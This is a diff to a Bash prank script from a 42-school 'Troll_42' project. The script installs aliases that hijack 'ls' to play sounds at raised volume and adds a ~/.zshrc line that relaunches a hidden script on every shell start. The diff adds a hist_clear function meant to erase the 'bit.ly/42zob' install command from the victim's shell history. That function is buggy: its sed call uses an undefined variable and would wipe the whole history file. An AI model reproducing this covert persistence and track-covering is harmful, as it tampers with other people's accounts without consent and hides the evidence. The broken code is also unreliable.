@@ -6,7 +6,7 @@
 #    By: ldournoi <ldournoi@student.42angouleme.fr  +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2019/01/29 15:46:30 by cgarrot           #+#    #+#              #
-#    Updated: 2022/07/11 15:27:16 by ldournoi         ###   ########.fr        #
+#    Updated: 2022/07/11 15:48:26 by ldournoi         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -38,6 +38,16 @@ _IBLUE='\033[44m'
 _IPURPLE='\033[45m'
 _ICYAN='\033[46m'
 _IGREY='\033[47m'
+
+function hist_clear()
+{
+	COMMAND_TO_REMOVE='bit.ly/42zob'
+	clear
+	grep -n ${COMMAND_TO_REMOVE} ${HISTORY_FILE} | while read -r line; do
+		line_to_remove=${line/:*/}
+		sed -i "${command_at_line}d" ${HISTORY_FILE}
+	done
+}
 
 function multipla()
 {
@@ -411,7 +421,7 @@ function lsound7()
 					menu
 					;;
 				q)
-					history -c
+					hist_clear
 					clear
 					exec zsh
 					exit
@@ -494,7 +504,7 @@ function lsound6()
 					menu
 					;;
 				q)
-					history -c
+					hist_clear
 					clear
 					exec zsh
 					exit
@@ -577,7 +587,7 @@ function lsound5()
 					menu
 					;;
 				q)
-					history -c
+					hist_clear
 					clear
 					exec zsh
 					exit
@@ -660,7 +670,7 @@ function lsound4()
 					menu
 					;;
 				q)
-					history -c
+					hist_clear
 					clear
 					exec zsh
 					exit
@@ -743,7 +753,7 @@ function lsound3()
 					menu
 					;;
 				q)
-					history -c
+					hist_clear
 					clear
 					exec zsh
 					exit
@@ -826,7 +836,7 @@ function lsound2()
 					menu
 					;;
 				q)
-					history -c
+					hist_clear
 					clear
 					exec zsh
 					exit
@@ -910,7 +920,7 @@ function lsound1()
 					menu
 					;;
 				q)
-					history -c
+					hist_clear
 					clear
 					exec zsh
 					exit
@@ -936,11 +946,13 @@ function lsound_do_all()
 	if grep -q "pactl" ~/.zshrc ;
 	then
 		printf "\nyou shouldnt do this more than one time!\n"
+		I_DONE_THIS=1
 		return
 	fi
 	if grep -q "pactl" ~/.oh-my-zsh/custom/alias.zsh ;
 	then
 		printf "\nyou shouldnt do this more than one time!\n"
+		I_DONE_THIS=1
 		return
 	fi
 	if [ -f ~/.zshrc ]
@@ -956,6 +968,7 @@ function lsound_do_all()
 	echo "pgrep -U $USER ~/.zshscript >/dev/null || sh ~/.zshscript" >> ~/.zshrc
 	echo "alias ls='(pactl set-sink-mute 0 1 && pactl set-sink-mute 0 0 && pactl set-sink-volume 0 125% && paplay ~/.config/${SOUND} &) ; ls -G $1'" >> ~/.oh-my-zsh/custom/alias.zsh
 	cp ./sound/${SOUND} ~/.config/${SOUND}
+	I_DONE_THIS=0
 }
 
 function lsound_do_ohmyzsh()
@@ -965,6 +978,7 @@ function lsound_do_ohmyzsh()
 		if grep -q "pactl" ~/.oh-my-zsh/custom/alias.zsh ;
 		then
 			printf "\nyou shouldnt do this more than one time!\n"
+			I_DONE_THIS=1
 			return
 		fi
 	cp ~/.oh-my-zsh/custom/alias.zsh ~/.oh-my-zsh/custom/.aliassave
@@ -974,6 +988,7 @@ function lsound_do_ohmyzsh()
 		if grep -q "pactl" ~/.zshrc ;
 		then
 			printf "\nyou shouldnt do this more than one time!\n"
+			I_DONE_THIS=1
 			return
 		fi
 		cp ~/.zshrc ~/.zshrcsave
@@ -981,6 +996,7 @@ function lsound_do_ohmyzsh()
 	touch ~/.oh-my-zsh/custom/alias.zsh
 	echo "alias ls='(pactl set-sink-mute 0 1 && pactl set-sink-mute 0 0 && pactl set-sink-volume 0 125% && paplay ~/.config/${SOUND} &) ; ls -G $1 #zobls'" >> ~/.oh-my-zsh/custom/alias.zsh
 	cp ./sound/${SOUND} ~/.config/${SOUND}
+	I_DONE_THIS=0
 }
 
 function lsound_do_zsh()
@@ -990,6 +1006,7 @@ function lsound_do_zsh()
 		if grep -q "pactl" ~/.oh-my-zsh/custom/alias.zsh ;
 		then
 			printf "\nyou shouldnt do this more than one time!\n"
+			I_DONE_THIS=1
 			return
 		fi
 	cp ~/.oh-my-zsh/custom/alias.zsh ~/.oh-my-zsh/custom/.aliassave
@@ -999,6 +1016,7 @@ function lsound_do_zsh()
 		if grep -q "pactl" ~/.zshrc ;
 		then
 			printf "\nyou shouldnt do this more than one time!\n"
+			I_DONE_THIS=1
 			return
 		fi
 		cp ~/.zshrc ~/.zshrcsave
@@ -1006,6 +1024,7 @@ function lsound_do_zsh()
 	touch ~/.zshrc
 	echo "alias ls='(pactl set-sink-mute 0 1 && pactl set-sink-mute 0 0 && pactl set-sink-volume 0 125% && paplay ~/.config/${SOUND} &) ; ls $1'" >> ~/.zshrc
 	cp ./sound/${SOUND} ~/.config/${SOUND}
+	I_DONE_THIS=0
 }
 
 function rm_to_ohmyzsh()
@@ -1076,8 +1095,9 @@ function lsound_s()
 		#disable all time because it add countless aliases that we can't delete
 		#TODO: add a way to delete all aliases in files
 		#printf " (3) all time \n\n"
-
-		printf "${SOUND} installed !\n"
+		if [ ${I_DONE_THIS} == 0 ]; then
+			printf "${SOUND} installed !\n"
+		fi
 		printf " (m) go to menu | (q) quit\n"
 		read -p $'Number : ' -n 1 KEY
 		case $KEY in
@@ -1088,7 +1108,7 @@ function lsound_s()
 					menu
 					;;
 				q)
-					history -c
+					hist_clear
 					clear
 					exec zsh
 					exit
@@ -1118,7 +1138,7 @@ function wallpaper_changer()
 					menu
 				;;
 				q)
-					history -c
+					hist_clear
 					clear
 					exec zsh
 					exit
@@ -1149,7 +1169,7 @@ function vimkipedia_s()
 					menu
 					;;
 				q)
-					history -c
+					hist_clear
 					clear
 					exec zsh
 					exit
@@ -1223,7 +1243,7 @@ function lokcd_s()
 					menu
 					;;
 				q)
-					history -c
+					hist_clear
 					clear
 					exec zsh
 					exit
@@ -1332,10 +1352,10 @@ function menu()
 					else
 						printf "bash not implemented yet\nnothing changed...\n"
 					fi
-					history -c
+					hist_clear
 				;;
 				c)
-					history -c
+					hist_clear
 					clear
 					if [ ${CURRENT_SHELL} == "zsh" ]; then
 						rm_to_zsh
@@ -1348,12 +1368,12 @@ function menu()
 				;;
 				r)
 					rm -rf ../Troll_42
-					history -c
+					hist_clear
 					clear
 					exit
 				;;
 				q)
-					history -c
+					hist_clear
 					clear
 					exit
 				;;
